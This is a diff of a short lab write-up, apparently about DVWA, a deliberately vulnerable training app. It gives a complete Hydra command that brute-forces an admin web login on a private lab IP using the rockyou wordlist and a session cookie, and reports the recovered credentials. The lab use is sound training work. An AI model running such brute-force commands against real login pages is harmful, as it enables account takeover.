@@ -15,7 +15,7 @@
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.110 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=j0hhk5h9tv98ldtfn6aajf83h6; security=low:F=Username and/or password incorrect."
 
-username: admin
+username: admin  
 password : password
 
 ![image](https://github.com/user-attachments/assets/9e8950f1-766e-4c92-94c6-d2b8330dc09d)
